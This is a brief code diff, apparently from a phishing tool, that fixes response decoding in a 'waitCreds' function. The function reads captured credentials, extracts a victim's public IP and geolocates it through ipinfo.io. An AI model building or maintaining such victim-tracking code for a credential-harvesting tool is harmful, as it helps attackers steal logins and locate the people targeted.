@@ -151,8 +151,8 @@ def waitCreds():
             lines = creds.read().rstrip()
         if len(lines) != 0:
             ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
-            resp = urlopen('https://ipinfo.io/%s/json' % ip).read()
-            ipinfo = json.loads(resp)
+            resp = urlopen('https://ipinfo.io/%s/json' % ip)
+            ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
             if 'bogon' in ipinfo:
                   print ('======================================================================'.format(RED, END))
                   print (' \n{0}[ VICTIM IP BOGUS ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
